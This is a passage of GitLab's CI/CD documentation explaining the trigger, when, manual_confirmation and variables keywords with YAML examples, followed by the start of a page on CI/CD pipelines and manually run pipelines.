- [`needs`](https://docs.gitlab.com/ci/yaml/#needs), but not [`needs:project`](https://docs.gitlab.com/ci/yaml/#needsproject).
- [`only` and `except`](https://docs.gitlab.com/ci/yaml/deprecated_keywords/#only--except).
- [`parallel`](https://docs.gitlab.com/ci/yaml/#parallel).
- [`rules`](https://docs.gitlab.com/ci/yaml/#rules).
- [`stage`](https://docs.gitlab.com/ci/yaml/#stage).
- [`trigger`](https://docs.gitlab.com/ci/yaml/#trigger).
- [`variables`](https://docs.gitlab.com/ci/yaml/#variables).
- [`when`](https://docs.gitlab.com/ci/yaml/#when) (only with a value of `on_success`, `on_failure`, or `always`).
- [`resource_group`](https://docs.gitlab.com/ci/yaml/#resource_group).
- [`environment`](https://docs.gitlab.com/ci/yaml/#environment).

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- For multi-project pipelines, the path to the downstream project. CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file)
in GitLab 15.3 and later, but not [job-only variables](https://docs.gitlab.com/ci/variables/predefined_variables/#variable-availability).
Alternatively, use [`trigger:project`](https://docs.gitlab.com/ci/yaml/#triggerproject).
- For child pipelines, use [`trigger:include`](https://docs.gitlab.com/ci/yaml/#triggerinclude).

**Example of `trigger`**:

YAML Copy to clipboard

```yaml
trigger-multi-project-pipeline:
trigger: my-group/my-project
```

**Additional details**:

- You can use [`when:manual`](https://docs.gitlab.com/ci/yaml/#when) in the same job as `trigger`, but you cannot
use the API to start `when:manual` trigger jobs. See [issue 284086](https://gitlab.com/gitlab-org/gitlab/-/issues/284086)
for more details.
- You cannot [manually specify CI/CD variables](https://docs.gitlab.com/ci/jobs/job_control/#specify-variables-when-running-manual-jobs)
before running a manual trigger job.
- [CI/CD variables](https://docs.gitlab.com/ci/yaml/#variables) defined in a top-level `variables` section (globally) or in the trigger job are forwarded
to the downstream pipeline as [trigger variables](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#pass-cicd-variables-to-a-downstream-pipeline).
- [Pipeline variables](https://docs.gitlab.com/ci/variables/#cicd-variable-precedence) are not passed
to downstream pipelines by default. Use [trigger:forward](https://docs.gitlab.com/ci/yaml/#triggerforward) to forward
these variables to downstream pipelines.
- [Job-only variables](https://docs.gitlab.com/ci/variables/predefined_variables/#variable-availability)
are not available in trigger jobs.
- Environment variables [defined in the runner’s `config.toml`](https://docs.gitlab.com/runner/configuration/advanced-configuration.html#the-runners-section) are not available to trigger jobs and are not passed to downstream pipelines.
- You cannot use [`needs:pipeline:job`](https://docs.gitlab.com/ci/yaml/#needspipelinejob) in a trigger job.

**Related topics**:

- [Multi-project pipeline configuration examples](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#trigger-a-downstream-pipeline-from-a-job-in-the-gitlab-ciyml-file).
- To run a pipeline for a specific branch, tag, or commit, you can use a [trigger token](https://docs.gitlab.com/ci/triggers/)
to authenticate with the [pipeline triggers API](https://docs.gitlab.com/api/pipeline_triggers/).
The trigger token is different than the `trigger` keyword.

#### `trigger:inputs` [Permalink](https://docs.gitlab.com/ci/yaml/\#triggerinputs "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/519963) in GitLab 17.11.

Use `trigger:inputs` to set the [inputs](https://docs.gitlab.com/ci/inputs/) for a multi-project pipeline
when the downstream pipeline configuration uses [`spec:inputs`](https://docs.gitlab.com/ci/yaml/#specinputs).

**Example of `trigger:inputs`**:

YAML Copy to clipboard

```yaml
trigger:
  - project: 'my-group/my-project'
    inputs:
      website: "My website"
```

#### `trigger:include` [Permalink](https://docs.gitlab.com/ci/yaml/\#triggerinclude "Permalink")

Use `trigger:include` to declare that a job is a “trigger job” which starts a
[child pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines).

Additionally, use:

- `trigger:include:artifact` to trigger a [dynamic child pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#dynamic-child-pipelines).
- `trigger:include:inputs` to set the [inputs](https://docs.gitlab.com/ci/inputs/) when the downstream pipeline configuration
uses [`spec:inputs`](https://docs.gitlab.com/ci/yaml/#specinputs).

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- The path to the child pipeline’s configuration file.

**Example of `trigger:include`**:

YAML Copy to clipboard

```yaml
trigger-child-pipeline:
trigger:
    include: path/to/child-pipeline.gitlab-ci.yml
```

**Related topics**:

- [Child pipeline configuration examples](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#trigger-a-downstream-pipeline-from-a-job-in-the-gitlab-ciyml-file).

#### `trigger:include:inputs` [Permalink](https://docs.gitlab.com/ci/yaml/\#triggerincludeinputs "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/519963) in GitLab 17.11.

Use `trigger:include:inputs` to set the [inputs](https://docs.gitlab.com/ci/inputs/) for a child pipeline
when the downstream pipeline configuration uses [`spec:inputs`](https://docs.gitlab.com/ci/yaml/#specinputs).

**Example of `trigger:inputs`**:

YAML Copy to clipboard

```yaml
trigger-job:
trigger:
    include:
      - local: path/to/child-pipeline.yml
        inputs:
          website: "My website"
```

#### `trigger:project` [Permalink](https://docs.gitlab.com/ci/yaml/\#triggerproject "Permalink")

Use `trigger:project` to declare that a job is a “trigger job” which starts a
[multi-project pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#multi-project-pipelines).

By default, the multi-project pipeline triggers for the default branch. Use `trigger:branch`
to specify a different branch.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- The path to the downstream project. CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file)
in GitLab 15.3 and later, but not [job-only variables](https://docs.gitlab.com/ci/variables/predefined_variables/#variable-availability).

**Example of `trigger:project`**:

YAML Copy to clipboard

```yaml
trigger-multi-project-pipeline:
trigger:
    project: my-group/my-project
```

**Example of `trigger:project` for a different branch**:

YAML Copy to clipboard

```yaml
trigger-multi-project-pipeline:
trigger:
    project: my-group/my-project
    branch: development
```

**Related topics**:

- [Multi-project pipeline configuration examples](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#trigger-a-downstream-pipeline-from-a-job-in-the-gitlab-ciyml-file).
- To run a pipeline for a specific branch, tag, or commit, you can also use a [trigger token](https://docs.gitlab.com/ci/triggers/)
to authenticate with the [pipeline triggers API](https://docs.gitlab.com/api/pipeline_triggers/).
The trigger token is different than the `trigger` keyword.

#### `trigger:strategy` [Permalink](https://docs.gitlab.com/ci/yaml/\#triggerstrategy "Permalink")

Use `trigger:strategy` to force the `trigger` job to wait for the downstream pipeline to complete
before it is marked as **success**.

This behavior is different than the default, which is for the `trigger` job to be marked as
**success** as soon as the downstream pipeline is created.

This setting makes your pipeline execution linear rather than parallel.

**Example of `trigger:strategy`**:

YAML Copy to clipboard

```yaml
trigger_job:
trigger:
    include: path/to/child-pipeline.yml
    strategy: depend
```

In this example, jobs from subsequent stages wait for the triggered pipeline to
successfully complete before starting.

**Additional details**:

- [Optional manual jobs](https://docs.gitlab.com/ci/jobs/job_control/#types-of-manual-jobs) in the downstream pipeline
do not affect the status of the downstream pipeline or the upstream trigger job.
The downstream pipeline can complete successfully without running any optional manual jobs.
- [Blocking manual jobs](https://docs.gitlab.com/ci/jobs/job_control/#types-of-manual-jobs) in the downstream pipeline
must run before the trigger job is marked as successful or failed. The trigger job
shows **running** (
status\_running) if the downstream pipeline status is
**waiting for manual action** (
status\_manual) due to manual jobs.
By default, jobs in later stages do not start until the trigger job completes.
- If the downstream pipeline has a failed job, but the job uses [`allow_failure: true`](https://docs.gitlab.com/ci/yaml/#allow_failure),
the downstream pipeline is considered successful and the trigger job shows **success**.

#### `trigger:forward` [Permalink](https://docs.gitlab.com/ci/yaml/\#triggerforward "Permalink")

History

- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/355572) in GitLab 15.1. [Feature flag `ci_trigger_forward_variables`](https://gitlab.com/gitlab-org/gitlab/-/issues/355572) removed.

Use `trigger:forward` to specify what to forward to the downstream pipeline. You can control
what is forwarded to both [parent-child pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines)
and [multi-project pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#multi-project-pipelines).

Forwarded variables do not get forwarded again in nested downstream pipelines by default,
unless the nested downstream trigger job also uses `trigger:forward`.

**Supported values**:

- `yaml_variables`: `true` (default), or `false`. When `true`, variables defined
in the trigger job are passed to downstream pipelines.
- `pipeline_variables`: `true` or `false` (default). When `true`, [pipeline variables](https://docs.gitlab.com/ci/variables/#cicd-variable-precedence)
are passed to the downstream pipeline.

**Example of `trigger:forward`**:

[Run this pipeline manually](https://docs.gitlab.com/ci/pipelines/#run-a-pipeline-manually), with
the CI/CD variable `MYVAR = my value`:

YAML Copy to clipboard

```yaml
variables: # default variables for each job
VAR: value

# Default behavior:
# - VAR is passed to the child
# - MYVAR is not passed to the child
child1:
trigger:
    include: .child-pipeline.yml

# Forward pipeline variables:
# - VAR is passed to the child
# - MYVAR is passed to the child
child2:
trigger:
    include: .child-pipeline.yml
    forward:
      pipeline_variables: true

# Do not forward YAML variables:
# - VAR is not passed to the child
# - MYVAR is not passed to the child
child3:
trigger:
    include: .child-pipeline.yml
    forward:
      yaml_variables: false
```

**Additional details**:

- CI/CD variables forwarded to downstream pipelines with `trigger:forward` are [pipeline variables](https://docs.gitlab.com/ci/variables/#cicd-variable-precedence),
which have high precedence. If a variable with the same name is defined in the downstream pipeline,
that variable is usually overwritten by the forwarded variable.

### `when` [Permalink](https://docs.gitlab.com/ci/yaml/\#when "Permalink")

Use `when` to configure the conditions for when jobs run. If not defined in a job,
the default value is `when: on_success`.

**Keyword type**: Job keyword. You can use it as part of a job. `when: always` and `when: never` can also be used in [`workflow:rules`](https://docs.gitlab.com/ci/yaml/#workflow).

**Supported values**:

- `on_success` (default): Run the job only when no jobs in earlier stages fail.
- `on_failure`: Run the job only when at least one job in an earlier stage fails.
- `never`: Don’t run the job regardless of the status of jobs in earlier stages.
Can only be used in a [`rules`](https://docs.gitlab.com/ci/yaml/#ruleswhen) section or [`workflow: rules`](https://docs.gitlab.com/ci/yaml/#workflowrules).
- `always`: Run the job regardless of the status of jobs in earlier stages.
- `manual`: Add the job to the pipeline as a [manual job](https://docs.gitlab.com/ci/jobs/job_control/#create-a-job-that-must-be-run-manually).
- `delayed`: Add the job to the pipeline as a [delayed job](https://docs.gitlab.com/ci/jobs/job_control/#run-a-job-after-a-delay).

**Example of `when`**:

YAML Copy to clipboard

```yaml
stages:
  - build
  - cleanup_build
  - test
  - deploy
  - cleanup

build_job:
stage: build
script:
    - make build

cleanup_build_job:
stage: cleanup_build
script:
    - cleanup build when failed
when: on_failure

test_job:
stage: test
script:
    - make test

deploy_job:
stage: deploy
script:
    - make deploy
when: manual
environment: production

cleanup_job:
stage: cleanup
script:
    - cleanup after jobs
when: always
```

In this example, the script:

1. Executes `cleanup_build_job` only when `build_job` fails.
2. Always executes `cleanup_job` as the last step in pipeline regardless of
success or failure.
3. Executes `deploy_job` when you run it manually in the GitLab UI.

**Additional details**:

- When evaluating the status of jobs for `on_success` and `on_failure`:
  - Jobs with [`allow_failure: true`](https://docs.gitlab.com/ci/yaml/#allow_failure) in earlier stages are considered successful, even if they failed.
  - Skipped jobs in earlier stages, for example [manual jobs that have not been started](https://docs.gitlab.com/ci/jobs/job_control/#create-a-job-that-must-be-run-manually),
    are considered successful.
- The default value for [`allow_failure`](https://docs.gitlab.com/ci/yaml/#allow_failure) is `true` with `when: manual`. The default value
changes to `false` with [`rules:when: manual`](https://docs.gitlab.com/ci/yaml/#ruleswhen).

**Related topics**:

- `when` can be used with [`rules`](https://docs.gitlab.com/ci/yaml/#rules) for more dynamic job control.
- `when` can be used with [`workflow`](https://docs.gitlab.com/ci/yaml/#workflow) to control when a pipeline can start.

#### `manual_confirmation` [Permalink](https://docs.gitlab.com/ci/yaml/\#manual_confirmation "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/18906) in GitLab 17.1.

Use `manual_confirmation` with [`when: manual`](https://docs.gitlab.com/ci/yaml/#when) to define a custom confirmation message for manual jobs.
If there is no manual job defined with `when: manual`, this keyword has no effect.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A string with the confirmation message.

**Example of `manual_confirmation`**:

YAML Copy to clipboard

```yaml
delete_job:
stage: post-deployment
script:
    - make delete
when: manual
manual_confirmation: 'Are you sure you want to delete this environment?'
```

## `variables` [Permalink](https://docs.gitlab.com/ci/yaml/\#variables "Permalink")

Use `variables` to define [CI/CD variables](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-gitlab-ciyml-file).

Variables can be [defined in a CI/CD job](https://docs.gitlab.com/ci/yaml/#job-variables), or as a top-level (global) keyword to define
[default CI/CD variables](https://docs.gitlab.com/ci/yaml/#default-variables) for all jobs.

**Additional details**:

- All YAML-defined variables are also set to any linked [Docker service containers](https://docs.gitlab.com/ci/services/).
- YAML-defined variables are meant for non-sensitive project configuration. Store sensitive information
in [protected variables](https://docs.gitlab.com/ci/variables/#protect-a-cicd-variable) or [CI/CD secrets](https://docs.gitlab.com/ci/secrets/).
- [Manual pipeline variables](https://docs.gitlab.com/ci/variables/#use-pipeline-variables)
and [scheduled pipeline variables](https://docs.gitlab.com/ci/pipelines/schedules/#add-a-pipeline-schedule)
are not passed to downstream pipelines by default. Use [trigger:forward](https://docs.gitlab.com/ci/yaml/#triggerforward)
to forward these variables to downstream pipelines.

**Related topics**:

- [Predefined variables](https://docs.gitlab.com/ci/variables/predefined_variables/) are variables the runner
automatically creates and makes available in the job.
- You can [configure runner behavior with variables](https://docs.gitlab.com/ci/runners/configure_runners/#configure-runner-behavior-with-variables).

### Job `variables` [Permalink](https://docs.gitlab.com/ci/yaml/\#job-variables "Permalink")

You can use job variables in commands in the job’s `script`, `before_script`, or `after_script` sections,
and also with some [job keywords](https://docs.gitlab.com/ci/yaml/#job-keywords). Check the **Supported values** section of each job keyword
to see if it supports variables.

You cannot use job variables as values for [global keywords](https://docs.gitlab.com/ci/yaml/#global-keywords) like
[`include`](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include).

**Supported values**: Variable name and value pairs:

- The name can use only numbers, letters, and underscores ( `_`). In some shells,
the first character must be a letter.
- The value must be a string.

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of job `variables`**:

YAML Copy to clipboard

```yaml
review_job:
variables:
    DEPLOY_SITE: "https://dev.example.com/"
    REVIEW_PATH: "/review"
script:
    - deploy-review-script --url $DEPLOY_SITE --path $REVIEW_PATH
```

In this example:

- `review_job` has `DEPLOY_SITE` and `REVIEW_PATH` job variables defined.
Both job variables can be used in the `script` section.

### Default `variables` [Permalink](https://docs.gitlab.com/ci/yaml/\#default-variables "Permalink")

Variables defined in a top-level `variables` section act as default variables
for all jobs.

Each default variable is made available to every job in the pipeline, except when
the job already has a variable defined with the same name. The variable defined in the job
[takes precedence](https://docs.gitlab.com/ci/variables/#cicd-variable-precedence), so the value of
the default variable with the same name cannot be used in the job.

Like job variables, you cannot use default variables as values for other global keywords,
like [`include`](https://docs.gitlab.com/ci/yaml/includes/#use-variables-with-include).

**Supported values**: Variable name and value pairs:

- The name can use only numbers, letters, and underscores ( `_`). In some shells,
the first character must be a letter.
- The value must be a string.

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Examples of `variables`**:

YAML Copy to clipboard

```yaml
variables:
DEPLOY_SITE: "https://example.com/"

deploy_job:
stage: deploy
script:
    - deploy-script --url $DEPLOY_SITE --path "/"
environment: production

deploy_review_job:
stage: deploy
variables:
    DEPLOY_SITE: "https://dev.example.com/"
    REVIEW_PATH: "/review"
script:
    - deploy-review-script --url $DEPLOY_SITE --path $REVIEW_PATH
environment: production
```

In this example:

- `deploy_job` has no variables defined. The default `DEPLOY_SITE` variable is copied to the job
and can be used in the `script` section.
- `deploy_review_job` already has a `DEPLOY_SITE` variable defined, so the default `DEPLOY_SITE`
is not copied to the job. The job also has a `REVIEW_PATH` job variable defined.
Both job variables can be used in the `script` section.

#### `variables:description` [Permalink](https://docs.gitlab.com/ci/yaml/\#variablesdescription "Permalink")

Use the `description` keyword to define a description for a default variable.
The description displays with [the prefilled variable name when running a pipeline manually](https://docs.gitlab.com/ci/pipelines/#prefill-variables-in-manual-pipelines).

**Keyword type**: You can only use this keyword with default `variables`, not job `variables`.

**Supported values**:

- A string. You can use Markdown.

**Example of `variables:description`**:

YAML Copy to clipboard

```yaml
variables:
DEPLOY_NOTE:
    description: "The deployment note. Explain the reason for this deployment."
```

**Additional details**:

- When used without `value`, the variable exists in pipelines that were not triggered manually,
and the default value is an empty string ( `''`).

#### `variables:value` [Permalink](https://docs.gitlab.com/ci/yaml/\#variablesvalue "Permalink")

Use the `value` keyword to define a pipeline-level (default) variable’s value. When used with
[`variables: description`](https://docs.gitlab.com/ci/yaml/#variablesdescription), the variable value is [prefilled when running a pipeline manually](https://docs.gitlab.com/ci/pipelines/#prefill-variables-in-manual-pipelines).

**Keyword type**: You can only use this keyword with default `variables`, not job `variables`.

**Supported values**:

- A string.

**Example of `variables:value`**:

YAML Copy to clipboard

```yaml
variables:
DEPLOY_ENVIRONMENT:
    value: "staging"
    description: "The deployment target. Change this variable to 'canary' or 'production' if needed."
```

**Additional details**:

- If used without [`variables: description`](https://docs.gitlab.com/ci/yaml/#variablesdescription), the behavior is
the same as [`variables`](https://docs.gitlab.com/ci/yaml/#variables).

#### `variables:options` [Permalink](https://docs.gitlab.com/ci/yaml/\#variablesoptions "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/105502) in GitLab 15.7.

Use `variables:options` to define an array of values that are [selectable in the UI when running a pipeline manually](https://docs.gitlab.com/ci/pipelines/#configure-a-list-of-selectable-prefilled-variable-values).

Must be used with `variables: value`, and the string defined for `value`:

- Must also be one of the strings in the `options` array.
- Is the default selection.

If there is no [`description`](https://docs.gitlab.com/ci/yaml/#variablesdescription),
this keyword has no effect.

**Keyword type**: You can only use this keyword with default `variables`, not job `variables`.

**Supported values**:

- An array of strings.

**Example of `variables:options`**:

YAML Copy to clipboard

```yaml
variables:
DEPLOY_ENVIRONMENT:
    value: "staging"
    options:
      - "production"
      - "staging"
      - "canary"
    description: "The deployment target. Set to 'staging' by default."
```

### `variables:expand` [Permalink](https://docs.gitlab.com/ci/yaml/\#variablesexpand "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/353991) in GitLab 15.6 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_raw_variables_in_yaml_config`. Disabled by default.
- [Enabled on GitLab.com](https://gitlab.com/gitlab-org/gitlab/-/issues/375034) in GitLab 15.6.
- [Enabled on GitLab Self-Managed](https://gitlab.com/gitlab-org/gitlab/-/issues/375034) in GitLab 15.7.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/375034) in GitLab 15.8. Feature flag `ci_raw_variables_in_yaml_config` removed.

Use the `expand` keyword to configure a variable to be expandable or not.

**Keyword type**: You can use this keyword with both default and job `variables`.

**Supported values**:

- `true` (default): The variable is expandable.
- `false`: The variable is not expandable.

**Example of `variables:expand`**:

YAML Copy to clipboard

```yaml
variables:
VAR1: value1
VAR2: value2 $VAR1
VAR3:
    value: value3 $VAR1
    expand: false
```

- The result of `VAR2` is `value2 value1`.
- The result of `VAR3` is `value3 $VAR1`.

**Additional details**:

- The `expand` keyword can only be used with default and job `variables` keywords.
You can’t use it with [`rules:variables`](https://docs.gitlab.com/ci/yaml/#rulesvariables) or [`workflow:rules:variables`](https://docs.gitlab.com/ci/yaml/#workflowrulesvariables).

## Help & feedback

[Edit this page](https://gitlab.com/gitlab-org/gitlab/-/blob/master/doc/ci/yaml/_index.md)

[Suggest updates](https://gitlab.com/gitlab-org/gitlab/-/issues/new?issuable_template=Documentation)

[Request support](https://about.gitlab.com/support/)

[View pricing](https://about.gitlab.com/pricing/)

[Try GitLab for free](https://about.gitlab.com/free-trial/)

[Post on the GitLab forum](https://forum.gitlab.com/new-topic?title=topic%20title&body=topic%20body&tags=docs-feedback)

![Company Logo](https://cdn.cookielaw.org/logos/aa14a5c8-79e3-442a-8177-464ad850b19d/e46c1d0d-1f66-481f-bc06-5427671431da/253e6fee-c4c0-4b60-bc35-79cdae5dda32/gitlab-logo-100.png)

## Privacy Preference Center

## Privacy Preference Center

- ### Your Privacy

- ### Strictly Necessary Cookies

- ### Functionality Cookies

- ### Performance and Analytics Cookies

- ### Targeting and Advertising Cookies

- ### Ad User Data

- ### Ad Personalization


#### Your Privacy

When you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies. This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience. Because we respect your right to privacy, you can choose not to allow some types of cookies. Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.


[Cookie Policy](https://about.gitlab.com/privacy/cookies/)

User ID:  29385098-0e60-49a2-bb41-98bc970226a7

This User ID will be used as a unique identifier while storing and accessing your preferences for future.

Timestamp:  --

#### Strictly Necessary Cookies

Always Active

These cookies are necessary for the website to function and cannot be switched off in our systems. They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, enabling you to securely log into the site, filling in forms, or using the customer checkout. GitLab processes any personal data collected through these cookies on the basis of our legitimate interest.

Cookies Details‎

#### Functionality Cookies

Functionality Cookies

These cookies enable helpful but non-essential website functions that improve your website experience. By recognizing you when you return to our website, they may, for example, allow us to personalize our content for you or remember your preferences. If you do not allow these cookies then some or all of these services may not function properly. GitLab processes any personal data collected through these cookies on the basis of your consent

Cookies Details‎

#### Performance and Analytics Cookies

Performance and Analytics Cookies

These cookies allow us and our third-party service providers to recognize and count the number of visitors on our websites and to see how visitors move around our websites when they are using it. This helps us improve our products and ensures that users can easily find what they need on our websites. These cookies usually generate aggregate statistics that are not associated with an individual. To the extent any personal data is collected through these cookies, GitLab processes that data on the basis of your consent.

Cookies Details‎

#### Targeting and Advertising Cookies

Targeting and Advertising Cookies

These cookies enable different advertising related functions. They may allow us to record information about your visit to our websites, such as pages visited, links followed, and videos viewed so we can make our websites and the advertising displayed on it more relevant to your interests. They may be set through our website by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant advertisements on other websites. GitLab processes any personal data collected through these cookies on the basis of your consent.

Cookies Details‎

#### Ad User Data

Ad User Data

Sets consent for sending user data to Google for advertising purposes.

Cookies Details‎

#### Ad Personalization

Ad Personalization

Sets consent for personalized advertising.

Cookies Details‎

Back Button

### Cookie List

Filter Button

ConsentLeg.Interest

checkbox labellabel

checkbox labellabel

checkbox labellabel

Clear

checkbox labellabel

ApplyCancel

Confirm My Choices

Allow All

[![Powered by Onetrust](https://cdn.cookielaw.org/logos/static/powered_by_logo.svg)](https://www.onetrust.com/products/cookie-consent/)

---


## 3. CI/CD pipelines {#section-3}

*Source: [https://docs.gitlab.com/ee/ci/pipelines/](https://docs.gitlab.com/ee/ci/pipelines/)*

# CI/CD pipelines

- Tier: Free, Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

CI/CD pipelines are the fundamental component of GitLab CI/CD. Pipelines are configured
in a `.gitlab-ci.yml` file by using [YAML keywords](https://docs.gitlab.com/ci/yaml/).

Pipelines can run automatically for specific events, like when pushing to a branch,
creating a merge request, or on a schedule. When needed, you can also run pipelines manually.

Pipelines are composed of:

- [Global YAML keywords](https://docs.gitlab.com/ci/yaml/#global-keywords) that control the overall
behavior of the project’s pipelines.
- [Jobs](https://docs.gitlab.com/ci/jobs/) that execute commands to accomplish a task. For example,
a job could compile, test, or deploy code. Jobs run independently from each other,
and are executed by [runners](https://docs.gitlab.com/ci/runners/).
- Stages, which define how to group jobs together. Stages run in sequence, while the jobs
in a stage run in parallel. For example, an early stage could have jobs that lint and compile
code, while later stages could have jobs that test and deploy code. If all jobs in a stage succeed,
the pipeline moves on to the next stage. If any job in a stage fails, the next stage
is not (usually) executed and the pipeline ends early.

A small pipeline could consist of three stages, executed in the following order:

- A `build` stage, with a job called `compile` that compiles the project’s code.
- A `test` stage, with two jobs called `test1` and `test2` that run various tests on the code.
These tests would only run if the `compile` job completed successfully.
- A `deploy` stage, with a job called `deploy-to-production`. This job would only run
if both jobs in the `test` stage started and completed successfully.

To get started with your first pipeline, see [Create and run your first GitLab CI/CD pipeline](https://docs.gitlab.com/ci/quick_start/).

## Types of pipelines [Permalink](https://docs.gitlab.com/ci/pipelines/\#types-of-pipelines "Permalink")

Pipelines can be configured in many different ways:

- [Basic pipelines](https://docs.gitlab.com/ci/pipelines/pipeline_architectures/#basic-pipelines) run everything in each stage concurrently,
followed by the next stage.
- [Pipelines that use the `needs` keyword](https://docs.gitlab.com/ci/yaml/needs/) run based on dependencies
between jobs and can run more quickly than basic pipelines.
- [Merge request pipelines](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/) run for merge
requests only (rather than for every commit).
- [Merged results pipelines](https://docs.gitlab.com/ci/pipelines/merged_results_pipelines/)
are merge request pipelines that act as though the changes from the source branch have
already been merged into the target branch.
- [Merge trains](https://docs.gitlab.com/ci/pipelines/merge_trains/)
use merged results pipelines to queue merges one after the other.
- [Parent-child pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines) break down complex pipelines
into one parent pipeline that can trigger multiple child sub-pipelines, which all
run in the same project and with the same SHA. This pipeline architecture is commonly used for mono-repos.
- [Multi-project pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#multi-project-pipelines) combine pipelines for different projects together.

## Configure a pipeline [Permalink](https://docs.gitlab.com/ci/pipelines/\#configure-a-pipeline "Permalink")

Pipelines and their component jobs and stages are defined with [YAML keywords](https://docs.gitlab.com/ci/yaml/)
in the CI/CD pipeline configuration file for each project. When editing CI/CD configuration
in GitLab, you should use the [pipeline editor](https://docs.gitlab.com/ci/pipeline_editor/).

You can also configure specific aspects of your pipelines through the GitLab UI:

- [Pipeline settings](https://docs.gitlab.com/ci/pipelines/settings/) for each project.
- [Pipeline schedules](https://docs.gitlab.com/ci/pipelines/schedules/).
- [Custom CI/CD variables](https://docs.gitlab.com/ci/variables/#for-a-project).

If you use VS Code to edit your GitLab CI/CD configuration, the [GitLab Workflow extension for VS Code](https://docs.gitlab.com/editor_extensions/visual_studio_code/)
helps you [validate your configuration](https://marketplace.visualstudio.com/items?itemName=GitLab.gitlab-workflow#validate-gitlab-ci-configuration)
and [view your pipeline status](https://marketplace.visualstudio.com/items?itemName=GitLab.gitlab-workflow#information-about-your-branch-pipelines-mr-closing-issue).

### Run a pipeline manually [Permalink](https://docs.gitlab.com/ci/pipelines/\#run-a-pipeline-manually "Permalink")

History

- **Run pipeline** name [changed](https://gitlab.com/gitlab-org/gitlab/-/issues/482718) to **New pipeline** in GitLab 17.7.
- **Inputs** option [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/525504) in GitLab 17.11 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_inputs_for_pipelines`. Enabled by default.
- **Inputs** option [generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/536548) in GitLab 18.1. Feature flag `ci_inputs_for_pipelines` removed.

Pipelines can be manually executed, with predefined or manually-specified [variables](https://docs.gitlab.com/ci/variables/).

You might do this if the results of a pipeline (for example, a code build) are required outside the standard
operation of the pipeline.

To execute a pipeline manually:

1. On the left sidebar, select **Search or go to** and find your project.
2. Select **Build > Pipelines**.
3. Select **New pipeline**.
4. In the **Run for branch name or tag** field, select the branch or tag to run the pipeline for.
5. (Optional) Enter any:
   - [Inputs](https://docs.gitlab.com/ci/inputs/) required for the pipeline to run. Default values for inputs are prefilled,
     but can be modified. Input values must follow the expected type.
   - [CI/CD variables](https://docs.gitlab.com/ci/variables/). You can configure variables to have their
     [values prefilled in the form](https://docs.gitlab.com/ci/pipelines/#prefill-variables-in-manual-pipelines). Using inputs to
     control pipeline behavior offers improved security and flexibility over CI/CD variables.
6. Select **New pipeline**.

The pipeline now executes the jobs as configured.

#### Prefill variables in manual pipelines [Permalink](https://docs.gitlab.com/ci/pipelines/\#prefill-variables-in-manual-pipelines "Permalink")

History

- Markdown rendering on the **Run pipeline** page [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/441474) in GitLab 17.11.

You can use the [`description` and `value`](https://docs.gitlab.com/ci/yaml/#variablesdescription)
keywords to [define pipeline-level (global) variables](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-gitlab-ciyml-file)
that are prefilled when running a pipeline manually. Use the description to explain
information such as what the variable is used for, and what the acceptable values are.
You can use Markdown in the description.

Job-level variables cannot be pre-filled.

In manually-triggered pipelines, the **New pipeline** page displays all pipeline-level variables
that have a `description` defined in the `.gitlab-ci.yml` file. The description displays
below the variable.

You can change the prefilled value, which [overrides the value](https://docs.gitlab.com/ci/variables/#use-pipeline-variables) for that single pipeline run.
Any variables overridden by using this process are [expanded](https://docs.gitlab.com/ci/variables/#prevent-cicd-variable-expansion)
and not [masked](https://docs.gitlab.com/ci/variables/#mask-a-cicd-variable).
If you do not define a `value` for the variable in the configuration file, the variable name is still listed,
but the value field is blank.

For example:

YAML Copy to clipboard

```yaml
variables:
  DEPLOY_CREDENTIALS:
    description: "The deployment credentials."
  DEPLOY_ENVIRONMENT:
    description: "Select the deployment target. Valid options are: 'canary', 'staging', 'production', or a stable branch of your choice."
    value: "canary"
```

In this example:

